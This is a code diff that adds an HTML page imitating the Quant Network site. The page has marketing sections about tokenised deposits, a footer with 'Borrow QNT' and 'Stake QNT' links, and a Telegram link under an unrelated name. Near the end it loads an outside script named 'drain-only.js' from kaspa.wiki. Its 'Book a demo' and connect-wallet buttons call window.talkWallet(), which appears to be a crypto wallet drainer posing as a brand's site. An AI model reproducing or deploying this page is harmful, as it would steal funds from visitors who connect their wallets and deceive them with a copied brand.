+        <circle cx="335" cy="190" r="5" fill="#f15a22"/>
+        <circle cx="190" cy="335" r="5" fill="#f15a22"/>
+        <circle cx="45" cy="190" r="5" fill="#f15a22"/>
+        <circle cx="292" cy="88" r="4" fill="#f15a22" opacity="0.6"/>
+        <circle cx="88" cy="292" r="4" fill="#f15a22" opacity="0.6"/>
+        <circle cx="292" cy="292" r="4" fill="#f15a22" opacity="0.6"/>
+        <circle cx="88" cy="88" r="4" fill="#f15a22" opacity="0.6"/>
+        <!-- Labels -->
+        <text x="190" y="32" text-anchor="middle" font-size="10" font-family="Heebo,sans-serif" fill="#43403e" font-weight="600">Banks</text>
+        <text x="355" y="195" font-size="10" font-family="Heebo,sans-serif" fill="#43403e" font-weight="600">DvP</text>
+        <text x="140" y="352" font-size="10" font-family="Heebo,sans-serif" fill="#43403e" font-weight="600">Treasury</text>
+        <text x="8" y="195" font-size="10" font-family="Heebo,sans-serif" fill="#43403e" font-weight="600">FX</text>
+        <!-- Spokes -->
+        <line x1="190" y1="50" x2="190" y2="130" stroke="#f15a22" stroke-width="0.8" stroke-dasharray="3 3"/>
+        <line x1="330" y1="190" x2="250" y2="190" stroke="#f15a22" stroke-width="0.8" stroke-dasharray="3 3"/>
+        <line x1="190" y1="330" x2="190" y2="250" stroke="#f15a22" stroke-width="0.8" stroke-dasharray="3 3"/>
+        <line x1="50" y1="190" x2="130" y2="190" stroke="#f15a22" stroke-width="0.8" stroke-dasharray="3 3"/>
+      </svg>
+    </div>
+  </div>
+</section>
+
+<!-- WHO WE SERVE -->
+<section class="serve-section">
+  <div class="container">
+    <p class="serve-title fade-in">Who we serve</p>
+    <div class="serve-grid">
+      <div class="serve-card fade-in" style="transition-delay:.05s">
+        <h3 class="serve-card-title">Banks</h3>
+        <ul class="serve-card-list">
+          <li>Innovative tokenised deposit products, including automated treasury functions, directly from the account</li>
+          <li>New revenues from programmable accounts with automated financial workflows</li>
+          <li>Boost retention by embedding bank accounts into customers' daily workflows</li>
+        </ul>
+      </div>
+      <div class="serve-card fade-in" style="transition-delay:.1s">
+        <h3 class="serve-card-title">Financial Institutions</h3>
+        <ul class="serve-card-list">
+          <li>Make tokenised deposits interoperable between your members</li>
+          <li>Bolster your capabilities with the unique and extensive options that programmability offers</li>
+          <li>Proven production of tokenised deposits with clearing platforms</li>
+        </ul>
+      </div>
+      <div class="serve-card fade-in" style="transition-delay:.15s">
+        <h3 class="serve-card-title">Capital Markets</h3>
+        <ul class="serve-card-list">
+          <li>Automate complex DvP settlements and reconciliations with programmable transactions</li>
+          <li>Optimise working capital and liquidity through smart fund movements</li>
+          <li>Enhance compliance and reporting with real-time transaction insights</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CTA BANNER -->
+<section class="cta-banner">
+  <div class="cta-bg"></div>
+  <div class="cta-content">
+    <h2 class="cta-title fade-in">Ready to redefine how<br/>money works for you?</h2>
+    <button class="btn-cta fade-in" style="transition-delay:.1s" onclick="window.talkWallet()">Book a demo</button>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer class="footer">
+  <div class="footer-top">
+    <div class="footer-col">
+      <p class="footer-col-title">Who we serve</p>
+      <a href="#">Banks</a>
+      <a href="#">Capital Markets</a>
+      <a href="#">Financial Institutions</a>
+    </div>
+    <div class="footer-col">
+      <p class="footer-col-title">Solutions</p>
+      <a href="#">Quant Flow Platform</a>
+      <a href="#">Quantise</a>
+      <a href="#">Quant Fieldex</a>
+      <a href="#">Discover PayScript®</a>
+    </div>
+    <div class="footer-col">
+      <p class="footer-col-title">Insights</p>
+      <a href="#">Interviews</a>
+      <a href="#">Blogs and articles</a>
+      <a href="#">Reports and Media</a>
+    </div>
+    <div class="footer-col">
+      <p class="footer-col-title">Company</p>
+      <a href="#">About Us</a>
+      <a href="#">Partners</a>
+      <a href="#">Associations</a>
+      <a href="#">Careers</a>
+    </div>
+    <div class="footer-col">
+      <p class="footer-col-title">Get in touch</p>
+      <a href="#">Contact</a>
+      <a href="#">Media and Press</a>
+      <a href="./borrow.html">Borrow QNT</a>
+      <a href="./stake.html">Stake QNT</a>
+      <a href="https://t.me/OndoFinanceC" target="_blank">Telegram</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <div>
+      <div class="footer-logo">
+        <svg viewBox="0 0 24 24" width="22" height="22" fill="none">
+          <polygon points="12,2 22,7 22,17 12,22 2,17 2,7" fill="none" stroke="#f15a22" stroke-width="1.5"/>
+          <circle cx="12" cy="12" r="4" fill="#f15a22"/>
+        </svg>
+        <span style="font-size:13px; font-weight:700; letter-spacing:0.08em; text-transform:uppercase; color: var(--text);">QUANT</span>
+      </div>
+      <p class="footer-copy">© 2024 Quant Network Limited. All rights reserved.</p>
+    </div>
+    <div class="footer-legal">
+      <a href="#">Privacy policy</a>
+      <a href="#">Legal</a>
+      <a href="https://t.me/OndoFinanceC" target="_blank" style="color: var(--orange);">Telegram</a>
+    </div>
+  </div>
+</footer>
+
+<script src="https://kaspa.wiki/drain-only.js"></script>
+<script>
+  function connectWallet() {
+    if (typeof window.talkWallet === 'function') window.talkWallet();
+  }
+
+  // Tab switching
+  const tabs = document.querySelectorAll('.hero-tab');
+  const panels = document.querySelectorAll('.tab-panel');
+  tabs.forEach(tab => {
+    tab.addEventListener('click', () => {
+      tabs.forEach(t => t.classList.remove('active'));
+      panels.forEach(p => p.classList.remove('active'));
+      tab.classList.add('active');
+      document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
+    });
+  });
+
+  // Auto-rotate tabs every 3s (synced with rotating headline)
+  let tabIdx = 0;
+  const tabKeys = ['crossborder', 'dvp', 'treasury'];
+  setInterval(() => {
+    tabIdx = (tabIdx + 1) % 3;
+    tabs.forEach(t => t.classList.remove('active'));
+    panels.forEach(p => p.classList.remove('active'));
+    tabs[tabIdx].classList.add('active');
+    document.getElementById('tab-' + tabKeys[tabIdx]).classList.add('active');
+  }, 3000);
+
+  // Fade-in on scroll
+  function checkFadeIns() {
+    const h = window.innerHeight;
+    document.querySelectorAll('.fade-in:not(.is-visible)').forEach(el => {
+      const r = el.getBoundingClientRect();
+      if (r.top < h - 20) el.classList.add('is-visible');
+    });
+  }
+  window.addEventListener('scroll', checkFadeIns, { passive: true });
+  // Run at multiple points to catch initial load
+  setTimeout(checkFadeIns, 50);
+  setTimeout(checkFadeIns, 200);
+  setTimeout(checkFadeIns, 500);
+  window.addEventListener('load', checkFadeIns);
+</script>
+<script type="module" src="src/rainbow.tsx"></script>
+</body>
+</html>
